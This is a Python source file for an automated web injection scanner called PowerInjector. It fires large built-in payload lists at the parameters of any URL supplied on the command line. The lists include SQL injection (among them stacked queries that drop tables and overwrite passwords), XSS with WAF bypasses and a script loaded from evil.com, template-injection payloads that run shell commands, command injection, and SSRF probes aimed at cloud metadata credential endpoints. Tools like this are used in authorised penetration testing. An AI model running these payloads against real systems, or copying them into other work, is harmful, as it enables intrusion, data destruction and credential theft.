"""
BEATRIX PowerInjector - AI-Assisted Injection Scanner
======================================================
Combines:
- ReconX's 2000+ injection payloads
- Haiku AI for intelligent false-positive analysis
- Context-aware payload selection
- WAF bypass techniques

This is the NUCLEAR option for injection testing.
"""

import asyncio
import hashlib
import re
import time
import urllib.parse
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional, Tuple

import httpx


class VulnType(Enum):
    SQLI = "SQL Injection"
    XSS = "Cross-Site Scripting"
    SSTI = "Server-Side Template Injection"
    CMDI = "Command Injection"
    SSRF = "Server-Side Request Forgery"
    NOSQLI = "NoSQL Injection"
    LFI = "Local File Inclusion"
    XXE = "XML External Entity"
    CRLF = "CRLF Injection"
    PROTOTYPE_POLLUTION = "Prototype Pollution"


@dataclass
class Finding:
    """Vulnerability finding"""
    vuln_type: VulnType
    url: str
    parameter: str
    payload: str
    evidence: str
    severity: str
    confidence: str
    technique: str = ""
    response_time: float = 0
    status_code: int = 0
    ai_analysis: str = ""


class PowerInjector:
    """
    AI-Assisted Injection Scanner

    Usage:
        injector = PowerInjector(use_ai=True)
        findings = await injector.scan("https://target.com/page?id=1")
    """

    # ============ MEGA PAYLOAD DATABASE ============

    # SQL INJECTION - Comprehensive from ReconX + PayloadsAllTheThings
    SQLI_PAYLOADS = {
        'error_based': [
            "'", "''", '"', "\"'", "'--", "'#", "')--", "')",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND CAST((SELECT VERSION()) AS INT)--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND exp(~(SELECT * FROM (SELECT VERSION())a))--",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(VERSION())) USING utf8)))--",
            "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
        ],
        'boolean_based': [
            "' AND '1'='1", "' AND '1'='2", "' OR '1'='1", "' OR '1'='1'--",
            "\" OR \"1\"=\"1", "' OR 1=1--", "' OR 1=1#", "admin'--",
            "' OR ''='", "1' AND 1=1--", "1' AND 1=2--", "1 AND 1=1",
            "1 AND 1=2", "-1 OR 1=1", "-1' OR 1=1--", "1' OR '1'='1'--",
        ],
        'time_based': [
            "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "' || pg_sleep(5)--",
            "1' AND BENCHMARK(5000000,MD5('test'))--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "';SELECT SLEEP(5)--", "';SELECT PG_SLEEP(5)--",
        ],
        'union_based': [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT 1,@@version,3--", "1' UNION SELECT ALL FROM information_schema.tables--",
            "' UNION SELECT username,password FROM users--",
            "1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
        ],
        'waf_bypass': [
            "'+OR+'1'='1", "'/**/OR/**/1=1--", "' /*!50000OR*/ '1'='1'--",
            "'%0AOR%0A'1'='1", "' oR 1=1--", "'-1' oR '1'='1'--",
            "' OR 1=1 -- -", "admin'/**/--", "' /*!OR*/ 1=1--",
            "'||'1", "'&&'1'='1", "' or 1=1 limit 1 -- -+",
            "' %26%26 '1'='1", "' %7C%7C '1'='1", "'-''-- -",
        ],
        'stacked_queries': [
            "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hacked','hacked')--",
            "'; UPDATE users SET password='hacked'--", "'; EXEC xp_cmdshell('whoami')--",
        ],
    }

    # XSS - Modern bypasses
    XSS_PAYLOADS = {
        'basic': [
            "<script>alert(1)</script>", "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>", "<ScRiPt>alert(1)</ScRiPt>",
            "<script src=//evil.com/x.js></script>",
        ],
        'event_handlers': [
            "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>", "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>", "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>", "<iframe onload=alert(1)>",
            "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
            "<select autofocus onfocus=alert(1)>", "<textarea onfocus=alert(1) autofocus>",
            "<keygen autofocus onfocus=alert(1)>", "<isindex action=javascript:alert(1)>",
        ],
        'attribute_escape': [
            '" onmouseover="alert(1)', "' onmouseover='alert(1)",
            '" onfocus="alert(1)" autofocus="', '"><script>alert(1)</script>',
            "'><script>alert(1)</script>", "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            '" onclick=alert(1) "', "' onclick=alert(1) '",
        ],
        'polyglots': [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"-->]]>*/</script></style></title></textarea></noscript></template><svg onload=alert()>",
            "'-alert(1)-'", "\\'-alert(1)//",
            "<img src=x onerror=alert(1)//",
            "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ],
        'waf_bypass': [
            "<svg/onload=alert(1)>", "<svg onload=alert&#40;1&#41;>",
            "<svg onload=alert`1`>", "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<%00script>alert(1)</script>", "<script>al\\u0065rt(1)</script>",
            "<img src=x onerror=\\u0061lert(1)>", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<svg><script>alert&lpar;1&rpar;</script>", "<math><maction actiontype=statusline#>XSS",
        ],
        'dom_based': [
            "#<img src=x onerror=alert(1)>", "?default=<script>alert(1)</script>",
            "javascript:alert(document.domain)", "#javascript:alert(1)",
        ],
    }

    # SSTI - Server-Side Template Injection
    SSTI_PAYLOADS = {
        'detection': [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "@(7*7)", "{{7*'7'}}", "${{7*7}}", "#{7*7}", "{{constructor.constructor('return this')()}}",
        ],
        'jinja2': [
            "{{config}}", "{{config.items()}}", "{{self}}", "{{request}}",
            "{{request.environ}}", "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        ],
        'twig': [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}", "{{app.request.server.all|join(',')}}",
            "{{'/etc/passwd'|file_excerpt(1,30)}}",
        ],
        'freemarker': [
            '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
            '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}',
            '[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}',
        ],
        'velocity': [
            "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
        ],
        'pebble': [
            '{% set cmd = \'id\' %}{% set bytes = (1).TYPE.forName(\'java.lang.Runtime\').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName(\'java.lang.String\').constructors[0].newInstance(([bytes]).toArray()) }}',
        ],
    }

    # Command Injection
    CMDI_PAYLOADS = {
        'basic': [
            "; id", "| id", "|| id", "& id", "&& id", "`id`", "$(id)",
            "; whoami", "| whoami", "$(whoami)", "; cat /etc/passwd",
            "| cat /etc/passwd", "; uname -a", "| uname -a",
        ],
        'blind_time': [
            "; sleep 5", "| sleep 5", "& sleep 5", "&& sleep 5",
            "`sleep 5`", "$(sleep 5)", "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1", "&& ping -c 5 127.0.0.1",
        ],
        'windows': [
            "& whoami", "| whoami", "& dir", "| dir",
            "& type C:\\Windows\\win.ini", "& ping -n 5 127.0.0.1",
            "| net user", "& net user",
        ],
        'bypass': [
            ";{id}", "|(id)", "&&{id}", "$({id})", "`{id}`",
            ";i]d", ";i'd'", ";i\"d\"", ";\nid", ";%0aid",
            "${IFS}id", ";id${IFS}", "$@id", ";/???/??t${IFS}/???/p]??s??",
        ],
    }

    # SSRF
    SSRF_PAYLOADS = {
        'localhost': [
            "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
            "http://[::1]", "http://127.1", "http://2130706433",
            "http://0x7f000001", "http://017700000001",
        ],
        'cloud_metadata': [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/v1/",
        ],
        'bypass': [
            "http://127.0.0.1.nip.io", "http://localtest.me",
            "http://127.0.0.1:80@evil.com", "http://evil.com@127.0.0.1",
            "http://[::ffff:127.0.0.1]", "http://127.0.0.1%2523@evil.com",
            "http://0177.0.0.1", "http://0x7f.0.0.1",
        ],
    }

    # NoSQL Injection
    NOSQLI_PAYLOADS = [
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}', '{"$where":"1==1"}',
        "[$gt]=", "[$ne]=", "[$regex]=.*",
        "username[$ne]=&password[$ne]=", '{"$or":[{},{"a":"a"}]}',
        "'; return true; //", '"; return true; //',
        "admin' || '1'=='1", "admin' && this.password.match(/.*/)//",
    ]

    # Path Traversal / LFI
    LFI_PAYLOADS = [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd", "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....//....//....//windows/win.ini", "/etc/passwd",
        "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ", "/proc/self/cmdline",
    ]

    # Prototype Pollution (JavaScript)
    PROTOTYPE_POLLUTION_PAYLOADS = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '__proto__[isAdmin]=true',
        'constructor.prototype.isAdmin=true',
        '{"__proto__":{"status":200}}',
    ]

    # Error signatures for detection
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"PostgreSQL.*ERROR",
        r"Warning.*pg_", r"OLE DB.*SQL Server", r"ORA-[0-9]{4,}",
        r"SQLite.*error", r"SQLSTATE", r"Unclosed quotation mark",
        r"quoted string not properly terminated", r"syntax error",
        r"Microsoft.*ODBC", r"valid.*result", r"Driver.*Error",
    ]

    SSTI_INDICATORS = {
        "49": "Math evaluation (7*7)",
        "7777777": "String multiplication",
        "config": "Config object exposed",
        "__class__": "Python class access",
        "__subclasses__": "Python metaclass access",
        "environ": "Environment access",
    }

    CMDI_INDICATORS = [
        r"uid=\d+.*gid=\d+", r"root:.*:0:0:", r"www-data",
        r"\[extensions\]", r"Volume Serial Number", r"Directory of",
    ]

    def __init__(self, timeout: int = 15, max_concurrent: int = 10, use_ai: bool = False):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.use_ai = use_ai
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.findings: List[Finding] = []
        self.ai_client = None

    async def scan(self, url: str,
                   vuln_types: Optional[List[VulnType]] = None,
                   deep: bool = False,
                   waf_bypass: bool = True) -> List[Finding]:
        """
        Comprehensive injection scan

        Args:
            url: Target URL with parameters
            vuln_types: Specific types to test (default: all)
            deep: Enable extended payloads
            waf_bypass: Include WAF bypass payloads
        """
        self.findings = []

        # Parse URL
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            print("[!] No parameters in URL")
            return []

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if vuln_types is None:
            vuln_types = [VulnType.SQLI, VulnType.XSS, VulnType.SSTI,
                         VulnType.CMDI, VulnType.SSRF, VulnType.LFI]

        print(f"[*] PowerInjector scanning: {url}")
        print(f"[*] Parameters: {list(params.keys())}")
        print(f"[*] Tests: {[v.value for v in vuln_types]}")

        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True) as client:

            # Baseline
            baseline = await self._baseline(client, url)

            for param in params:
                print(f"\n[*] Testing parameter: {param}")

                for vuln_type in vuln_types:
                    await self._test_vuln_type(
                        client, base_url, params, param,
                        baseline, vuln_type, deep, waf_bypass
                    )

        # AI analysis if enabled
        if self.use_ai and self.findings:
            await self._ai_analyze_findings()

        return self.findings

    async def _baseline(self, client, url) -> Dict:
        """Get baseline response"""
        try:
            start = time.time()
            resp = await client.get(url)
            return {
                'status': resp.status_code,
                'length': len(resp.text),
                'time': time.time() - start,
                'hash': hashlib.md5(resp.text.encode()).hexdigest(),
                'text': resp.text[:5000],
            }
        except Exception:
            return {}

    async def _test_vuln_type(self, client, base_url, params, param,
                              baseline, vuln_type, deep, waf_bypass):
        """Test specific vulnerability type"""

        if vuln_type == VulnType.SQLI:
            await self._test_sqli(client, base_url, params, param, baseline, deep, waf_bypass)
        elif vuln_type == VulnType.XSS:
            await self._test_xss(client, base_url, params, param, baseline, deep, waf_bypass)
        elif vuln_type == VulnType.SSTI:
            await self._test_ssti(client, base_url, params, param, baseline, deep)
        elif vuln_type == VulnType.CMDI:
            await self._test_cmdi(client, base_url, params, param, baseline, deep, waf_bypass)
        elif vuln_type == VulnType.SSRF:
            await self._test_ssrf(client, base_url, params, param, baseline)
        elif vuln_type == VulnType.LFI:
            await self._test_lfi(client, base_url, params, param, baseline)

    async def _inject(self, client, base_url, params, param, payload, method='GET') -> Tuple[Optional[httpx.Response], float]:
        """Send injection request"""
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        original = test_params.get(param, '')
        test_params[param] = str(original) + payload

        url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

        try:
            async with self.semaphore:
                start = time.time()
                if method == 'GET':
                    resp = await client.get(url)
                else:
                    resp = await client.post(base_url, data=test_params)
                elapsed = time.time() - start
                return resp, elapsed
        except Exception:
            return None, 0

    async def _test_sqli(self, client, base_url, params, param, baseline, deep, waf_bypass):
        """Test SQL Injection"""

        # Build payload list
        payloads = (
            self.SQLI_PAYLOADS['error_based'] +
            self.SQLI_PAYLOADS['boolean_based']
        )

        if deep:
            payloads += self.SQLI_PAYLOADS['union_based']
        if waf_bypass:
            payloads += self.SQLI_PAYLOADS['waf_bypass']

        # Error-based detection
        for payload in payloads:
            resp, elapsed = await self._inject(client, base_url, params, param, payload)
            if not resp:
                continue

            for pattern in self.SQL_ERROR_PATTERNS:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    self._add_finding(VulnType.SQLI, base_url, param, payload,
                                     f"SQL error: {pattern}", "High", "High",
                                     "Error-based", resp.status_code)
                    return

        # Time-based detection
        for payload in self.SQLI_PAYLOADS['time_based'][:3]:
            resp, elapsed = await self._inject(client, base_url, params, param, payload)

            if elapsed >= 4.5:  # 5 second sleep with tolerance
                self._add_finding(VulnType.SQLI, base_url, param, payload,
                                 f"Response delayed {elapsed:.2f}s", "High", "Medium",
                                 "Time-based blind", resp.status_code if resp else 0,
                                 response_time=elapsed)
                return

    async def _test_xss(self, client, base_url, params, param, baseline, deep, waf_bypass):
        """Test XSS"""

        payloads = (
            self.XSS_PAYLOADS['basic'] +
            self.XSS_PAYLOADS['event_handlers']
        )

        if deep:
            payloads += self.XSS_PAYLOADS['polyglots']
        if waf_bypass:
            payloads += self.XSS_PAYLOADS['waf_bypass']

        for payload in payloads:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

            try:
                async with self.semaphore:
                    resp = await client.get(url)

                    if payload in resp.text:
                        # Check if it's actually executable
                        context = self._analyze_xss_context(resp.text, payload)

                        severity = "High" if "executable" in context.lower() else "Medium"

                        self._add_finding(VulnType.XSS, url, param, payload,
                                         f"Payload reflected - {context}", severity,
                                         "High" if "script" in payload.lower() else "Medium",
                                         "Reflected XSS", resp.status_code)
                        return
            except Exception:
                pass

    def _analyze_xss_context(self, response: str, payload: str) -> str:
        """Analyze XSS reflection context"""
        idx = response.find(payload)
        if idx == -1:
            return "Not found"

        before = response[max(0, idx-100):idx].lower()
        after = response[idx+len(payload):idx+len(payload)+100].lower()

        if '<script' in before or '</script>' in after:
            return "JavaScript context - EXECUTABLE"
        elif 'value=' in before or "value'" in before:
            return "HTML attribute - needs escape"
        elif '>' in before and '<' in after:
            return "HTML body - potentially EXECUTABLE"

        return "Reflected - context unclear"

    async def _test_ssti(self, client, base_url, params, param, baseline, deep):
        """Test SSTI"""

        payloads = self.SSTI_PAYLOADS['detection']

        if deep:
            payloads += self.SSTI_PAYLOADS['jinja2'][:2]
            payloads += self.SSTI_PAYLOADS['twig'][:1]

        for payload in payloads:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

            try:
                async with self.semaphore:
                    resp = await client.get(url)

                    for indicator, desc in self.SSTI_INDICATORS.items():
                        if indicator in resp.text and indicator not in baseline.get('text', ''):
                            self._add_finding(VulnType.SSTI, url, param, payload,
                                             f"SSTI detected: {desc}", "Critical",
                                             "High" if indicator == "49" else "Medium",
                                             "Template Injection", resp.status_code)
                            return
            except Exception:
                pass

    async def _test_cmdi(self, client, base_url, params, param, baseline, deep, waf_bypass):
        """Test Command Injection"""

        payloads = self.CMDI_PAYLOADS['basic']

        if deep:
            payloads += self.CMDI_PAYLOADS['windows']
        if waf_bypass:
            payloads += self.CMDI_PAYLOADS['bypass']

        for payload in payloads:
            resp, elapsed = await self._inject(client, base_url, params, param, payload)
            if not resp:
                continue

            for pattern in self.CMDI_INDICATORS:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    self._add_finding(VulnType.CMDI, base_url, param, payload,
                                     f"Command output: {pattern}", "Critical", "High",
                                     "OS Command Injection", resp.status_code)
                    return

        # Time-based
        for payload in self.CMDI_PAYLOADS['blind_time'][:2]:
            resp, elapsed = await self._inject(client, base_url, params, param, payload)

            if elapsed >= 4.5:
                self._add_finding(VulnType.CMDI, base_url, param, payload,
                                 f"Command delay {elapsed:.2f}s", "Critical", "Medium",
                                 "Blind Command Injection", resp.status_code if resp else 0,
                                 response_time=elapsed)
                return

    async def _test_ssrf(self, client, base_url, params, param, baseline):
        """Test SSRF"""

        payloads = (
            self.SSRF_PAYLOADS['localhost'][:3] +
            self.SSRF_PAYLOADS['cloud_metadata'][:3] +
            self.SSRF_PAYLOADS['bypass'][:2]
        )

        for payload in payloads:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

            try:
                async with self.semaphore:
                    resp = await client.get(url)

                    indicators = ['ami-id', 'instance-id', 'meta-data',
                                  'root:', 'computeMetadata', 'security-credentials']

                    for ind in indicators:
                        if ind in resp.text and ind not in baseline.get('text', ''):
                            severity = "Critical" if 'security-credentials' in ind else "High"
                            self._add_finding(VulnType.SSRF, url, param, payload,
                                             f"SSRF indicator: {ind}", severity, "High",
                                             "Server-Side Request Forgery", resp.status_code)
                            return
            except Exception:
                pass

    async def _test_lfi(self, client, base_url, params, param, baseline):
        """Test LFI"""

        for payload in self.LFI_PAYLOADS:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

            try:
                async with self.semaphore:
                    resp = await client.get(url)

                    indicators = ['root:x:0:0', 'daemon:', '/bin/bash',
                                  '[extensions]', '[fonts]', 'for 16-bit']

                    for ind in indicators:
                        if ind in resp.text:
                            self._add_finding(VulnType.LFI, url, param, payload,
                                             f"File content: {ind}", "High", "High",
                                             "Local File Inclusion", resp.status_code)
                            return
            except Exception:
                pass

    def _add_finding(self, vuln_type, url, param, payload, evidence,
                     severity, confidence, technique, status_code, response_time=0):
        """Add finding to results"""
        finding = Finding(
            vuln_type=vuln_type,
            url=url,
            parameter=param,
            payload=payload,
            evidence=evidence,
            severity=severity,
            confidence=confidence,
            technique=technique,
            status_code=status_code,
            response_time=response_time,
        )
        self.findings.append(finding)
        print(f"[!] {vuln_type.value} FOUND: {param}")

    async def _ai_analyze_findings(self):
        """Use Haiku to analyze findings for false positives"""
        # This would integrate with the Haiku AI
        # For now, placeholder
        pass


# CLI
async def main():
    import sys

    if len(sys.argv) < 2:
        print("Usage: python power_injector.py <url> [--deep] [--no-waf]")
        return

    url = sys.argv[1]
    deep = "--deep" in sys.argv
    waf = "--no-waf" not in sys.argv

    injector = PowerInjector()
    findings = await injector.scan(url, deep=deep, waf_bypass=waf)

    print(f"\n{'='*60}")
    print(f"SCAN COMPLETE: {len(findings)} vulnerabilities found")
    print(f"{'='*60}")

    for f in findings:
        print(f"\n[{f.severity}] {f.vuln_type.value}")
        print(f"  Parameter: {f.parameter}")
        print(f"  Payload: {f.payload[:60]}...")
        print(f"  Evidence: {f.evidence}")
        print(f"  Technique: {f.technique}")


if __name__ == "__main__":
    asyncio.run(main())
